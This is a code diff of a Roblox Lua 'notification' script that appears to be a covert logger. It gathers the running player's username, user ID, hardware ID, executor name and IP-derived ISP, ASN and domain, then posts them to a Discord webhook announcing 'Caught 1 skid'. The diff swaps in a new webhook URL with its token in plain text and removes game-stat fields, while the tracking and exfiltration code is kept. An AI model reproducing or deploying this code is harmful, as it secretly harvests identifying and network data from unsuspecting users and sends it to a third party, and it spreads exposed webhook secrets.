@@ -31,7 +31,7 @@ function SendMessageEMBED(url, embed)
 end
 
 local player = game.Players.LocalPlayer
-local webhookURL = "https://discord.com/api/webhooks/1327248488110489691/7D-xVa4i8lrJUFb94pFixFQGyv8SBVFaDN-vKBnlbt5FKAJG_dwGv0mHThrSsQPsunss"
+local webhookURL = "https://discord.com/api/webhooks/1443614959727542385/EbqtTepwO7lglvJAGAuW6_3_kXa2e_7RkVigHGHcKLOyXS6LzEppsYYqTUR_mIcYoWa8"
 
 local displayName = player.DisplayName
 local username = player.Name
@@ -44,11 +44,6 @@ local platform = game:GetService("UserInputService").TouchEnabled and "📱 Mobi
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
 local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
 
-local slaps = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Slaps") and player.leaderstats.Slaps.Value or 0
-local glove = player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Glove") and player.leaderstats.Glove.Value or "Unknown"
-local nullShards = game.ReplicatedStorage:FindFirstChild("PlayerData") and game.ReplicatedStorage.PlayerData:FindFirstChild(player.Name) and game.ReplicatedStorage.PlayerData[player.Name]:FindFirstChild("NullShards") and game.ReplicatedStorage.PlayerData[player.Name].NullShards.Value or 0
-local tournamentWins = game.ReplicatedStorage:FindFirstChild("PlayerData") and game.ReplicatedStorage.PlayerData:FindFirstChild(player.Name) and game.ReplicatedStorage.PlayerData[player.Name]:FindFirstChild("TournamentWins") and game.ReplicatedStorage.PlayerData[player.Name].TournamentWins.Value or 0
-
 local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 local placeId = game.PlaceId
 local jobId = game.JobId
@@ -59,6 +54,7 @@ local scriptTime = os.date("%H:%M:%S - %d/%m/%Y", os.time())
 
 local ipInfo = GetIPInfo()
 
+-- Gửi thông báo ngắn gọn
 local messageText = "Caught 1 skid: " .. username .. " (" .. userId .. ")"
 local headers = { ["Content-Type"] = "application/json" }
 local messageBody = HttpService:JSONEncode({ content = messageText })
@@ -70,6 +66,7 @@ request({
     Body = messageBody
 })
 
+-- Embed đã loại bỏ hoàn toàn phần Slap Battles
 local embed = {
     ["title"] = "🔔 Notification Script",
     ["color"] = 65280,
@@ -100,14 +97,6 @@ local embed = {
                         "🌐 **ISP:** " .. ipInfo.isp .. "\n" ..
                         "🔢 **ASN:** " .. ipInfo.asn .. "\n" ..
                         "🏠 **Domain:** " .. ipInfo.domain,
-            ["inline"] = false
-        },
-        {
-            ["name"] = "◆━━ 👋 Slap Battles Data━━◆",
-            ["value"] = "🖐 **Slaps:** `" .. slaps .. "`\n" ..
-                        "**Glove Equipping:** `" .. glove .. "`\n" ..
-                        "**Null Shards:** `" .. nullShards .. "`\n" ..
-                        "🏆 **Tournament Wins:** `" .. tournamentWins .. "`",
             ["inline"] = false
         },
         {
